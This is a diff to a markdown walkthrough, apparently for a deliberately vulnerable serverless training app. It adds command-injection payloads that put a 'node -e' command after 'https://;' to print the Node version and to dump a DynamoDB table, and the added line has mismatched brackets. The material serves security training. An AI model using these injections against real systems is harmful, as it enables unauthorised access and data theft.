@@ -72,9 +72,12 @@ This site also contains the **Insecure Serverless Deployment Configuration** vul
 Return to the previous tab
 
 ### Node.js Access
-Attempt to access content/information using Node.js 
-1. What version of node.js?
+Attempt to access content/information using Node.js  
+1. What version of node.js?  
+`https://; node -e 'const AWS = require(\"aws-sdk\"); (async () => {console.log("Running Node.js" + process.version))})();'`
+2. Can the database be scanned?  
 `https://; node -e 'const AWS = require(\"aws-sdk\"); (async () => {console.log(await new AWS.DynamoDB.DocumentClient().scan({TableName: process.env.TABLE_NAME}).promise());})();'`
+
 ## Enumeration
 ### Profile Enumeration
 1. Using the information found in the env variables create a user profile 
